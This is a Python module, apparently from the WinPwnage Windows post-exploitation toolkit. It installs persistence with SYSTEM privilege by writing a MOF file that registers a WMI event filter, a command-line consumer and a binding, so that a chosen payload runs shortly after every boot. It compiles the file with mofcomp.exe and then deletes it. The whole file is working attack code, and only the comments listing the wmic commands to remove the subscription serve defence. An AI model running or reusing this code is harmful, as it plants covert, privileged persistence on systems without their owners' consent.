import os
import time
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

# wmic /namespace:"\\root\subscription" PATH __EventFilter WHERE Name="wpEventFilter" DELETE
# wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="wpEventConsumer" DELETE
# wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="wpEventFilter"' DELETE

mofcomp_info = {
	"Description": "Gain persistence with system privilege using mofcomp and mof file",
	"Id": "16",
	"Type": "Persistence",
	"Fixed In": "999999",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "persist_mofcomp",
	"Function Payload": True,
}


def persist_mofcomp(payload):
	if payloads().exe(payload):
		mof_template = """#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\root\\\subscription")

instance of CommandLineEventConsumer as $Cons
{
	Name = "wpEventConsumer";    
	RunInteractively=false;
	CommandLineTemplate="cmd.exe /c """+os.path.join(payload)+"""";
};

instance of __EventFilter as $Filt
{
	Name = "wpEventFilter";
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360";    
	QueryLanguage = "WQL";    
	EventNamespace = "root\\\cimv2";
};

instance of __FilterToConsumerBinding
{
	Filter = $Filt;
	Consumer = $Cons;
};"""

		if information().admin():
			try:
				mof_file = open(os.path.join(tempfile.gettempdir(), "persist.mof"), "w")
				mof_file.write(mof_template)
				mof_file.close()
			except Exception as error:
				print_error("Cannot proceed, unable to write mof file to disk ({})".format(
					os.path.join(tempfile.gettempdir(), "persist.mof")))
				return False
			else:
				print_success("Successfully wrote mof template to disk ({})".format(
					os.path.join(tempfile.gettempdir(), "persist.mof")))

			time.sleep(5)

			if os.path.isfile(os.path.join(tempfile.gettempdir(), "persist.mof")) == True:
				print_info("Disabling file system redirection")
				with disable_fsr():
					print_success("Successfully disabled file system redirection")
					if process().create("mofcomp.exe {}".format(os.path.join(tempfile.gettempdir(), "persist.mof")), 0):
						print_success("Successfully compiled mof file containing our payload ({})".format(payload))
						print_success("Successfully installed persistence, payload will after boot")
					else:
						print_error("Unable to compile mof file containing our payload ({})".format(payload))
						return False

				time.sleep(5)

				try:
					os.remove(os.path.join(tempfile.gettempdir(), "persist.mof"))
				except Exception as error:
					print_error("Unable to cleanup")
					return False
				else:
					print_success("Successfully cleaned up, enjoy!")
			else:
				print_error("Unable to locate mof template on disk ({})".format(os.path.join(tempfile.gettempdir(), "persist.mof")))
				return False
		else:
			print_error("Cannot proceed, we are not elevated")
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
